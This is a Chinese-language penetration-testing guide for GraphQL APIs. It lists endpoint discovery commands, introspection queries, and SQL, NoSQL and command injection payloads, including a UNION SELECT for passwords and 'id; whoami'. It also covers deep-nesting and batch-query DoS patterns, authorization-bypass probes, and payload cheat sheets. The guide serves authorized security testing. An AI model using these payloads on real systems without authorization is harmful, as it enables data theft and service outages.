# GraphQL 注入测试方法论文档

---

# 第一部分：文档概述

## 1.1 编写目的
为渗透测试人员提供 GraphQL 应用注入漏洞的系统化测试流程，覆盖 GraphQL 特有的注入类型、DoS 攻击、信息泄露等安全问题。

## 1.2 适用范围
适用于使用 GraphQL API 的 Web 应用、移动应用后端，包括 Apollo、Relay、GraphQL Yoga 等框架的应用系统。

## 1.3 读者对象
本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 专题：GraphQL 应用注入系统化测试

### 2.1 技术介绍

GraphQL 注入测试针对 GraphQL API 特有的漏洞类型，包括：
- **GraphQL 注入**：类似 SQL 注入的查询注入
- **DoS 攻击**：深度查询、字段滥用、批量查询
- **信息泄露**：Schema 泄露、内省查询、错误信息
- **授权绕过**：字段级授权缺失、批量查询绕过

### 2.2 测试范围

| 测试对象 | 测试内容 |
|---------|---------|
| **端点** | /graphql、/graphiql、/playground |
| **注入类型** | 查询注入、命令注入、SQL 注入 |
| **DoS 攻击** | 深度查询、循环查询、批量查询 |
| **信息泄露** | Schema 内省、错误信息、字段枚举 |

### 2.3 测试流程

#### 2.3.1 GraphQL 端点发现

**端点探测：**
```
# 常见端点路径
/graphql
/graphiql
/playground
/api/graphql
/api/v1/graphql

# 工具探测
gobuster dir -u http://target -w graphql-endpoints.txt
ffuf -u http://target/FUZZ -w graphql-endpoints.txt
```

**内省查询测试：**
```graphql
# 检查是否启用内省
{
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields { name }
    }
  }
}
```

#### 2.3.2 信息收集

**Schema 枚举：**
```graphql
# 获取所有查询
{
  __type(name: "Query") {
    name
    fields {
      name
      type { name }
    }
  }
}

# 获取所有突变
{
  __type(name: "Mutation") {
    name
    fields {
      name
      type { name }
    }
  }
}

# 获取特定类型信息
{
  __type(name: "User") {
    name
    fields {
      name
      type { name }
    }
  }
}
```

**错误信息探测：**
```graphql
# 触发错误
{
  user(id: "invalid") {
    name
  }
}

# 观察错误信息
{
  errors: [
    {
      "message": "Invalid user ID",
      "locations": [...],
      "path": [...]
    }
  ]
}
```

#### 2.3.3 注入测试

**SQL 注入测试：**
```graphql
# 基础测试
{
  user(id: "1' OR '1'='1") {
    name
    email
  }
}

# 联合查询
{
  user(id: "1' UNION SELECT password FROM users--") {
    name
  }
}

# 盲注
{
  user(id: "1' AND SUBSTRING(password,1,1)='a'--") {
    name
  }
}
```

**命令注入测试：**
```graphql
# 如果存在命令执行 resolver
mutation {
  executeCommand(cmd: "id; whoami") {
    output
  }
}
```

**NoSQL 注入测试：**
```graphql
# MongoDB 注入
{
  users(filter: { username: { $ne: null } }) {
    name
    email
  }
}
```

#### 2.3.4 DoS 攻击测试

**深度查询测试：**
```graphql
# 深度嵌套查询
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              name
            }
          }
        }
      }
    }
  }
}
```

**循环查询测试：**
```graphql
# 循环引用
{
  user(id: 1) {
    friends {
      friends {
        # 回到原始用户，形成循环
      }
    }
  }
}
```

**批量查询测试：**
```graphql
# 大量并行查询
query {
  u1: user(id: 1) { name }
  u2: user(id: 2) { name }
  u3: user(id: 3) { name }
  ...
  u1000: user(id: 1000) { name }
}
```

**字段滥用测试：**
```graphql
# 请求大量字段
{
  user(id: 1) {
    id
    name
    email
    phone
    address
    createdAt
    updatedAt
    # ... 所有字段
  }
}
```

#### 2.3.5 授权绕过测试

**批量查询绕过：**
```graphql
# 批量获取其他用户数据
query {
  u1: user(id: 1) { email }
  u2: user(id: 2) { email }
  u3: user(id: 3) { email }
}
```

**字段级授权测试：**
```graphql
# 访问敏感字段
{
  user(id: 1) {
    name
    email
    password  # 尝试访问
    role      # 尝试访问
  }
}
```

### 2.4 测试用例清单

#### 2.4.1 Apollo GraphQL 测试

```graphql
# 内省查询
{
  __schema {
    types { name }
  }
}

# SQL 注入
{
  user(id: "1' OR '1'='1") {
    name
  }
}

# 批量查询
query {
  u1: user(id: 1) { email }
  u2: user(id: 2) { email }
}
```

#### 2.4.2 Relay GraphQL 测试

```graphql
# 节点查询
{
  node(id: "VXNlcjox") {
    ... on User {
      name
      email
    }
  }
}

# 连接查询
{
  users(first: 100) {
    edges {
      node {
        name
      }
    }
  }
}
```

#### 2.4.3 GraphiQL/Playground 测试

```
# 访问 GraphiQL 界面
GET /graphiql
GET /playground

# 如果未授权访问，可直接执行任意查询
```

#### 2.4.4 HTTP 头测试

```
# Content-Type
Content-Type: application/graphql

# 自定义头
X-APOLLO-OPERATION-NAME: TestQuery
X-GraphQL-Event-Log: true
```

### 2.5 自动化测试工具

#### 工具推荐

```bash
# GraphQL 扫描
graphql-cop -u http://target/graphql
inql -t http://target/graphql
gqlscan -u http://target/graphql

# GraphQL 模糊测试
gqlfuzz -u http://target/graphql

# 批量查询测试
batchql -u http://target/graphql

# Burp 插件
- GraphQL Support
- GraphQL Injection
- InQL
```

#### Burp Suite 插件

- **GraphQL Support** - 识别和解析 GraphQL 请求
- **InQL** - GraphQL 安全扫描
- **GraphQL Injection** - 注入测试
- **BatchQL** - 批量查询测试

### 2.6 测试报告要点

测试完成后，报告应包含：
1. GraphQL 端点和框架信息
2. Schema 内省是否启用
3. 所有测试的查询列表
4. 发现的漏洞点及详情
5. DoS 风险评估
6. 修复建议

---

# 第三部分：附录

## 3.1 GraphQL 注入 Payload 速查表

| 类别 | Payload | 说明 |
|-----|---------|------|
| **SQL 注入** | `user(id: "1' OR '1'='1")` | 基础注入 |
| **SQL 注入** | `user(id: "1' UNION SELECT...")` | 联合查询 |
| **SQL 注入** | `user(id: "1' AND 1=1--")` | 盲注 |
| **NoSQL 注入** | `user(filter: {username: {$ne: null}})` | MongoDB 注入 |
| **命令注入** | `executeCommand(cmd: "id")` | 命令执行 |

## 3.2 DoS 测试 Payload 速查表

| 类别 | Payload | 说明 |
|-----|---------|------|
| **深度查询** | 嵌套 10+ 层 | 资源耗尽 |
| **批量查询** | 1000+ 并行查询 | 服务器负载 |
| **字段滥用** | 请求所有字段 | 响应过大 |
| **循环查询** | 循环引用 | 无限递归 |

## 3.3 内省查询速查表

```graphql
# 获取 Schema
{ __schema { types { name } } }

# 获取查询类型
{ __type(name: "Query") { fields { name } } }

# 获取突变类型
{ __type(name: "Mutation") { fields { name } } }

# 获取特定类型
{ __type(name: "User") { fields { name type { name } } } }
```

## 3.4 参考资源

- [OWASP GraphQL Security](https://owasp.org/www-project-graphql-security/)
- [PortSwigger - GraphQL Injection](https://portswigger.net/web-security/graphql)
- [GraphQL Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [InQL Scanner](https://github.com/doyensec/inql)
